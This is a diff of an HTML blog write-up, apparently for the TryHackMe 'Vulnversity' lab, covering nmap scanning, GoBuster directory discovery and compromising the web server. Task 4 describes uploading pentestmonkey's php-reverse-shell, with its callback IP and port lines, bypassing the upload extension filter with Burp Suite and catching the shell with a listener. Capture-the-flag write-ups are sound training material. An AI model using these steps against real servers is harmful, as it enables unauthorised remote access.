@@ -142,7 +142,6 @@
 <h3 style="color: green"> [Task 1] Deploy the machine  </h3>
 
 <p>connect your computer to tryhackme network through openvpn</p>
-<br>
 <p>nmap is an free, open-source and powerful tool used to discover hosts and services on a computer network. In our example, we are using nmap to scan this machine to identify all services that are running on a particular port. nmap has many capabilities</p>
 
 <h3 style="color: green">[Task 2] Reconnaissance</h3>
@@ -195,11 +194,11 @@ Nmap done: 1 IP address (1 host up) scanned in 69.55 seconds  </code></pre>
 
 
 <p>if the flag of nmap is -p-400 means -p is reffers to port -400 refferst to portnumber 1 to 400 . so using this flag nmap will scan port 1 to 400 </p>
-<br>
+
 <p>Using the nmap flag -n will it not resolve DNS</p>
 
 <h3 style="color: green">[Task 3] Locating directories using GoBuster </h3>
-<p>GoBuster is a tool used to brute-force URIs (directories and files), DNS subdomains and virtual host names. For this machine, we will focus on using it to brute-force directories.and you can use to upload a shell to.</p>
+<p>GoBuster is a tool used to brute-force URIs (directories and files), DNS subdomains and virtual host names. For this Task, we will focus on using it to brute-force directories.and you can use to upload a shell to.</p>
 <br>
 <p> we know that on which port the http server is running its on port 3333. they say that thare is an upload page on the directory. but we dont know the name of the Directory .lets we try to find directory using gobuster   </p>
 <table>
@@ -242,28 +241,41 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================</code></pre>
 
 <p>on the directory <code>/in#######</code> we got an upload page </p><br>
-<img src="https://atomloop.github.io/image/tryhackme/Vulnversity/Screenshot_2020-08-28 Screenshot.png">
+<img src="https://atomloop.github.io/image/tryhackme/vulnversity/Screenshot_2020-08-28%20Screenshot.png">
 
 
-<h3 style="color: blue">[Task 4] Compromise the webserver </h3>
-<p>
-In this Task we need to compromise webserver using php-reverse-shell  .php-reverse-shell is a srcipt which helps to gain access the target shell . to do that Upload this script to somewhere in the web root then run it by accessing the appropriate URL in your browser.  The script will open an outbound TCP connection from the webserver to a host and port of your choice.  Bound to this TCP connection will be a shell.<br>
+<h3 style="color: green">[Task 4] Compromise the webserver </h3>
+<p style="font-size: 12 "> 
 
-This will be a proper interactive shell in which you can run interective programs like telnet, ssh and su.  It differs from web form-based shell which allow you to send a single command, then return you the output.
-
-you can found this php-revese-shell <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">here</a>
 
 To gain remote access to this machine, follow these steps:
 <br>
 1. verify that you are connected to tryhackme network using openvpn to conform that you can visit http://10.10.10.10 your will find your vpn tunnel ip . if you not found you are not connected to tryhackme network 
 <br>
-2.make sure that you need to modify the source code to indicate where you want the reverse shell thrown back to.  Edit the following lines of php-reverse-shell.php:
+2.In this Task we need to compromise webserver using php-reverse-shell  .php-reverse-shell is a srcipt which helps to gain access the target shell . to do that Upload this script to somewhere in the web root then run it by accessing the appropriate URL in your browser.  The script will open an outbound TCP connection from the webserver to a host and port of your choice.  Bound to this TCP connection will be a shell.<br>
+
+This will be a proper interactive shell in which you can run interective programs like telnet, ssh and su.  It differs from web form-based shell which allow you to send a single command, then return you the output.
+
+you can found this php-revese-shell <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">here</a>
+or if you are a kali user you will find this script on this directory  /usr/share/webshells.make a copy of it on other directory and edit as you want. make sure that you need to modify the source code to indicate where you want the reverse shell thrown back to. 
+<br>
+<h5> Edit the following lines of php-reverse-shell.php:</h5>
 
 $ip = '127.0.0.1';  // CHANGE THIS INTO YOUR VPN TUNNEL IP
+<br>
 $port = 1234;       // CHANGE THIS   
 <br>
-3.rename the php-reverce-shell script into a format which is supported to upload on target web. the default format of this script is .php but this format is not supported by our target .so you need to find which format is supported by our target to upload reverce-shell-script . you can do it manually or using burpsuit 
+3.Next you need to upload this script to target web . while uploding you may found this error <img src="https://atomloop.github.io/image/tryhackme/vulnversity/Screenshot 2020-08-28 18^%19^%20"> 
 <br>
+this means that the format of the script we uploded was not accepted by our target .so you need to find which format is supported by our target to upload reverce-shell-script . you can do it manually or you can use  burpsuit.
+on berpsuit intercept the form . <img src="https://atomloop.github.io/image/tryhackme/vulnversity/Screenshot_2020-08-28_18-00-04">
+<br>
+<h4> uploding Reverse-shell</h4>
+while try to upload the reverse-shell script we may find this error 
+<img src="https://atomloop.github.io/image/tryhackme/vulnversity/Screenshot 2020-08-28 18^%19^%20.png">
+
+<p>on burp suite . intercept the form that you are sending </p>
+
 <h2>Get Ready to catch the reverse shell</h2>
 
 Start a TCP listener on a host and port that will be accessible by the web server.  Use the same port here as you specified in the script (1234 in this example):
@@ -289,6 +301,9 @@ $ cat user.txt
 
 </code></pre></p>
 <h3 style="color: blue">[Task 5] Privilege Escalation </h3>
+
+
+
       
   </div>
   
